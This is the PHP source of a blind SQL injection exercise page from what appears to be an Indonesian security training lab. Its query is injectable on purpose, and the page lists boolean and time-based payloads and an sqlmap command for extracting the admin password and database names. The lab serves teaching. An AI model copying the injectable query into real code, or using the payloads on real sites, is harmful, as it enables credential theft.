<?php
require_once '../includes/db.php';
$conn = getDB();
$msg='';$mtype='';$ms=0;
$uid = $_GET['id'] ?? '';
if ($uid !== '') {
    $t0 = microtime(true);
    $res = $conn->query("SELECT id FROM users WHERE id='$uid' LIMIT 1");
    $ms = round((microtime(true)-$t0)*1000, 2);
    if ($res && $res->num_rows > 0) { $msg = "User found &mdash; kondisi <strong>TRUE</strong>"; $mtype = 'ok'; }
    elseif ($conn->error) { $msg = "System error occurred."; $mtype = 'warn'; }
    else { $msg = "User not found &mdash; kondisi <strong>FALSE</strong>"; $mtype = 'err'; }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Blind SQLi — ID-Networkers Lab</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:#080b13;color:#dde4ef;min-height:100vh;line-height:1.6;-webkit-font-smoothing:antialiased}
a{text-decoration:none;color:inherit}
:root{
  --bg:#080b13;--surface:#0e1420;--card:#111827;--el:#161e2e;
  --bd:#1d2b3a;--bd2:#263446;
  --red:#e63946;--rbg:rgba(230,57,70,.1);--rbdr:rgba(230,57,70,.2);
  --green:#22c55e;--gbg:rgba(34,197,94,.08);--gbdr:rgba(34,197,94,.2);
  --orange:#f59e0b;--obg:rgba(245,158,11,.08);--obdr:rgba(245,158,11,.2);
  --blue:#38bdf8;
  --t1:#dde4ef;--t2:#7b8fa8;--t3:#3d5168;
  --mono:'Courier New',monospace;--r:8px;--r2:12px
}
.nav{position:sticky;top:0;z-index:100;background:rgba(8,11,19,.96);backdrop-filter:blur(16px);border-bottom:1px solid var(--bd);height:60px;display:flex;align-items:center;padding:0 40px;gap:32px}
.nav-logo img{height:28px;display:block}
.nav-menu{display:flex;align-items:center;gap:2px;margin:0 auto}
.nav-menu a{font-size:.8rem;font-weight:600;letter-spacing:.02em;color:var(--t2);padding:6px 16px;border-radius:6px;transition:all .15s}
.nav-menu a:hover{color:var(--t1);background:var(--el)}
.nav-menu a.on{color:#fff;background:var(--red)}
.nav-pill{font-size:.65rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--red);border:1px solid var(--rbdr);border-radius:20px;padding:4px 12px}
.phdr{background:var(--surface);border-bottom:1px solid var(--bd);padding:32px 40px}
.phdr-in{max-width:1000px;margin:0 auto}
.bc{display:flex;align-items:center;gap:6px;font-size:.7rem;color:var(--t3);font-family:var(--mono);margin-bottom:10px}
.bc a{color:var(--t3)}.bc a:hover{color:var(--red)}.bc span{color:var(--t3)}
.phdr h1{font-size:1.5rem;font-weight:800;letter-spacing:-.02em;margin-bottom:6px;display:flex;align-items:center;gap:10px}
.phdr p{font-size:.86rem;color:var(--t2)}
.tag{font-size:.6rem;font-weight:700;letter-spacing:.1em;padding:3px 10px;border-radius:20px;font-family:var(--mono);border:1px solid}
.tag.r{color:var(--red);background:var(--rbg);border-color:var(--rbdr)}
.wrap{max-width:1000px;margin:0 auto;padding:28px 40px 72px}
.box{background:var(--card);border:1px solid var(--bd);border-radius:var(--r2);padding:22px 24px;margin-bottom:14px}
.box-t{font-size:.66rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--t3);margin-bottom:16px;display:flex;align-items:center;gap:8px}
.box-t::before{content:'';width:3px;height:12px;background:var(--red);border-radius:2px;flex-shrink:0}
.frow{display:flex;gap:10px;align-items:flex-end}
.fg{flex:1}
.fl{display:block;font-size:.66rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--t3);margin-bottom:6px;font-family:var(--mono)}
.fi{width:100%;padding:10px 14px;background:var(--bg);border:1px solid var(--bd);border-radius:var(--r);color:var(--t1);font-size:.88rem;font-family:var(--mono);outline:none;transition:border-color .15s}
.fi:focus{border-color:var(--red)}
.btn{display:inline-flex;align-items:center;padding:10px 22px;border:none;border-radius:var(--r);cursor:pointer;font-weight:700;font-size:.82rem;font-family:inherit;transition:all .15s;white-space:nowrap}
.btn-r{background:var(--red);color:#fff}.btn-r:hover{background:#c1121f}
.btn-g{background:var(--el);color:var(--t2);border:1px solid var(--bd)}.btn-g:hover{color:var(--t1)}

/* METER */
.meter{background:var(--bg);border:1px solid var(--bd);border-radius:var(--r2);padding:18px 24px;display:flex;align-items:center;gap:28px;margin-bottom:14px}
.meter-val{font-size:2.8rem;font-weight:800;font-family:var(--mono);line-height:1;color:var(--green)}
.meter-val.slow{color:var(--red)}
.meter-unit{font-size:1rem;font-weight:400;color:var(--t3)}
.meter-meta{display:flex;flex-direction:column;gap:4px}
.meter-lbl{font-size:.63rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--t3);font-family:var(--mono)}
.meter-note{font-size:.74rem;color:var(--t3);font-family:var(--mono)}
.meter-flag{font-size:.72rem;font-weight:700;color:var(--red);font-family:var(--mono);margin-top:2px}

/* ALERTS */
.alert{padding:13px 18px;border-radius:var(--r);font-size:.9rem;border:1px solid;margin-bottom:14px;line-height:1.5;text-align:center}
.a-ok{background:var(--gbg);border-color:var(--gbdr);color:var(--green)}
.a-err{background:var(--rbg);border-color:var(--rbdr);color:var(--red)}
.a-warn{background:var(--obg);border-color:var(--obdr);color:var(--orange)}

/* QUERY */
.qbox{background:var(--bg);border:1px solid var(--bd);border-left:3px solid var(--red);border-radius:var(--r);padding:14px 16px;font-family:var(--mono);font-size:.8rem;color:#a8c4e0;word-break:break-all;line-height:1.7;white-space:pre-wrap}
.ql{font-size:.6rem;letter-spacing:.12em;text-transform:uppercase;color:var(--t3);margin-bottom:6px;font-weight:700}
.kw{color:var(--red)}.val{color:var(--blue)}.str{color:var(--orange)}.cm{color:var(--t3)}

/* TECHNIQUE */
.tech-label{font-size:.8rem;font-weight:700;margin-bottom:10px}

/* OBJECTIVES */
.obj-list{list-style:none;display:flex;flex-direction:column;gap:10px}
.obj-list li{display:flex;align-items:flex-start;gap:12px;font-size:.86rem;color:var(--t2);line-height:1.5}
.obj-n{width:22px;height:22px;border-radius:50%;background:var(--rbg);border:1px solid var(--rbdr);color:var(--red);font-size:.64rem;font-weight:700;font-family:var(--mono);display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
.ic{background:var(--bg);border:1px solid var(--bd);padding:1px 6px;border-radius:4px;color:var(--green);font-family:var(--mono);font-size:.78rem}

/* HINTS */
.hint{background:var(--el);border:1px solid var(--bd);border-radius:var(--r);padding:12px 16px;margin-bottom:8px}
.hint summary{cursor:pointer;font-size:.84rem;font-weight:600;color:var(--t2);list-style:none;display:flex;align-items:center;gap:8px;user-select:none}
.hint summary::-webkit-details-marker{display:none}
.hint summary::before{content:'▶';font-size:.58rem;color:var(--red);transition:transform .15s;flex-shrink:0}
.hint[open] summary::before{transform:rotate(90deg)}
.hint-body{margin-top:12px;padding-top:12px;border-top:1px solid var(--bd);font-size:.83rem;color:var(--t2);line-height:1.8}

/* SPOILER */
.spoiler summary{cursor:pointer;font-size:.72rem;color:var(--t3);font-family:var(--mono);list-style:none;display:flex;align-items:center;gap:6px;margin-bottom:8px;user-select:none}
.spoiler summary::-webkit-details-marker{display:none}
.spoiler summary::before{content:'▶';font-size:.55rem;color:var(--red);transition:transform .15s}
.spoiler[open] summary::before{transform:rotate(90deg)}

footer{border-top:1px solid var(--bd);padding:22px 40px}
.foot{max-width:1000px;margin:0 auto;display:flex;align-items:center;gap:16px}
.foot img{height:20px;opacity:.35}
.foot p{font-size:.72rem;color:var(--t3);font-family:var(--mono)}
@media(max-width:700px){.nav,.wrap,.phdr,footer{padding-left:20px;padding-right:20px}.frow{flex-direction:column}}
</style>
</head>
<body>

<nav class="nav">
  <a class="nav-logo" href="/"><img src="/pict/LOGO-IDN-SOSMED-200x63.png" alt="ID-Networkers"></a>
  <div class="nav-menu">
    <a href="/">Dashboard</a>
    <a href="/basic/">Basic SQLi</a>
    <a href="/auth/">Auth Bypass</a>
    <a href="/blind/" class="on">Blind SQLi</a>
  </div>
  <div class="nav-pill">Security Lab</div>
</nav>

<div class="phdr">
  <div class="phdr-in">
    <div class="bc"><a href="/">Dashboard</a><span>/</span><span>Blind SQLi</span></div>
    <h1>Blind / Logic-Based SQLi <span class="tag r">HARD</span></h1>
    <p>Tidak ada data yang ditampilkan. Aplikasi hanya merespons TRUE atau FALSE. Gunakan logika untuk mengekstrak data satu karakter per karakter.</p>
  </div>
</div>

<div class="wrap">

  <div class="box">
    <div class="box-t">Penjelasan</div>
    <p style="font-size:.87rem;color:var(--t2);line-height:1.85">
      Berbeda dengan SQLi biasa, blind injection <strong style="color:var(--t1)">tidak menampilkan data</strong> dari database. Aplikasi hanya merespons dengan
      <span style="color:var(--green);font-weight:600">TRUE</span> (data ditemukan) atau
      <span style="color:var(--red);font-weight:600">FALSE</span> (tidak ditemukan).
      Kamu harus mengajukan pertanyaan boolean berulang kali &mdash; mirip seperti bermain 20 questions dengan database.
      Perhatikan juga <strong style="color:var(--t1)">response time</strong> untuk teknik time-based injection.
    </p>
  </div>

  <div class="box">
    <div class="box-t">Check User by ID</div>
    <form method="GET" action="/blind/">
      <div class="frow">
        <div class="fg">
          <label class="fl">User ID</label>
          <input class="fi" type="text" name="id" value="<?= htmlspecialchars($uid,ENT_QUOTES,'UTF-8') ?>" placeholder="1  atau  1' AND 1=1-- -">
        </div>
        <button type="submit" class="btn btn-r">Cek</button>
        <?php if($uid!==''): ?><a href="/blind/" class="btn btn-g" style="text-decoration:none">Reset</a><?php endif; ?>
      </div>
      <p style="margin-top:10px;font-size:.74rem;color:var(--t3);font-family:var(--mono)">Output hanya: found / not found + response time. Tidak ada data yang dikembalikan ke browser.</p>
    </form>
  </div>

  <?php if ($uid !== ''): ?>

  <div class="meter">
    <div class="meter-val <?= $ms > 2000 ? 'slow' : '' ?>"><?= $ms ?><span class="meter-unit"> ms</span></div>
    <div class="meter-meta">
      <div class="meter-lbl">Response Time</div>
      <div class="meter-note">Normal &lt; 100ms &nbsp;&bull;&nbsp; Time-based inject &gt; 3000ms</div>
      <?php if($ms > 2000): ?><div class="meter-flag">DELAY DETECTED</div><?php endif; ?>
    </div>
  </div>

  <div class="alert a-<?= $mtype ?>"><?= $msg ?></div>

  <details class="spoiler" style="margin-bottom:14px">
    <summary>Lihat query yang dieksekusi (spoiler)</summary>
    <div class="qbox"><div class="ql">SQL</div>SELECT id FROM users WHERE id='<?= htmlspecialchars($uid,ENT_QUOTES,'UTF-8') ?>' LIMIT 1</div>
  </details>

  <?php endif; ?>

  <div class="box">
    <div class="box-t">Teknik Extraction</div>

    <p class="tech-label" style="color:var(--orange)">Boolean-Based Blind</p>
    <div class="qbox" style="margin-bottom:20px">
<span class="cm">-- Apakah karakter pertama password admin adalah 'a'?</span>
<span class="val">1</span>' <span class="kw">AND SUBSTRING</span>((<span class="kw">SELECT</span> password <span class="kw">FROM</span> users <span class="kw">WHERE</span> username=<span class="str">'admin'</span>),<span class="val">1</span>,<span class="val">1</span>)=<span class="str">'a'</span><span class="cm">-- -</span>

<span class="cm">-- Apakah panjang password admin lebih dari 5?</span>
<span class="val">1</span>' <span class="kw">AND LENGTH</span>((<span class="kw">SELECT</span> password <span class="kw">FROM</span> users <span class="kw">WHERE</span> username=<span class="str">'admin'</span>))&gt;<span class="val">5</span><span class="cm">-- -</span></div>

    <p class="tech-label" style="color:var(--red)">Time-Based Blind</p>
    <div class="qbox">
<span class="cm">-- Jika kondisi TRUE, tunggu 3 detik (time-based confirmation)</span>
<span class="val">1</span>' <span class="kw">AND IF</span>(<span class="val">1</span>=<span class="val">1</span>, <span class="kw">SLEEP</span>(<span class="val">3</span>), <span class="val">0</span>)<span class="cm">-- -</span>

<span class="cm">-- Cek huruf pertama nama database</span>
<span class="val">1</span>' <span class="kw">AND IF</span>(<span class="kw">SUBSTRING</span>(<span class="kw">database</span>(),<span class="val">1</span>,<span class="val">1</span>)=<span class="str">'l'</span>, <span class="kw">SLEEP</span>(<span class="val">3</span>), <span class="val">0</span>)<span class="cm">-- -</span></div>
  </div>

  <div class="box">
    <div class="box-t">Hints</div>
    <details class="hint">
      <summary>Hint 1 &mdash; Konfirmasi Blind SQLi</summary>
      <div class="hint-body">
        ID valid: <code class="ic">1</code> &rarr; TRUE &nbsp;&bull;&nbsp; <code class="ic">1' AND 1=1-- -</code> &rarr; TRUE &nbsp;&bull;&nbsp; <code class="ic">1' AND 1=2-- -</code> &rarr; FALSE<br>
        Jika respons berbeda, injection berhasil dikonfirmasi.
      </div>
    </details>
    <details class="hint">
      <summary>Hint 2 &mdash; Ekstrak nama database</summary>
      <div class="hint-body">Gunakan <code class="ic">database()</code> satu karakter per karakter:<br><code class="ic">1' AND SUBSTRING(database(),1,1)='l'-- -</code></div>
    </details>
    <details class="hint">
      <summary>Hint 3 &mdash; Ekstrak password admin</summary>
      <div class="hint-body"><code class="ic">1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -</code><br>Ulangi untuk setiap posisi karakter.</div>
    </details>
    <details class="hint">
      <summary>Hint 4 &mdash; Automasi dengan SQLMap</summary>
      <div class="hint-body">Setelah memahami konsep manual, gunakan:<br><code class="ic">sqlmap -u "http://[IP]:8080/blind/?id=1" --technique=BT --dbs</code></div>
    </details>
  </div>

  <div class="box">
    <div class="box-t">Challenges</div>
    <ul class="obj-list">
      <li><div class="obj-n">1</div><span>Temukan nama database yang sedang digunakan</span></li>
      <li><div class="obj-n">2</div><span>Temukan nama semua tabel dalam database</span></li>
      <li><div class="obj-n">3</div><span>Ekstrak username dan password dari tabel <code class="ic">users</code></span></li>
      <li><div class="obj-n">4</div><span>Gunakan time-based untuk membaca isi tabel <code class="ic">flags</code></span></li>
    </ul>
  </div>

</div>

<footer>
  <div class="foot">
    <img src="/pict/LOGO-IDN-SOSMED-200x63.png" alt="ID-Networkers">
    <p>SQL Injection Lab &mdash; For Educational Purposes Only</p>
  </div>
</footer>
</body>
</html>
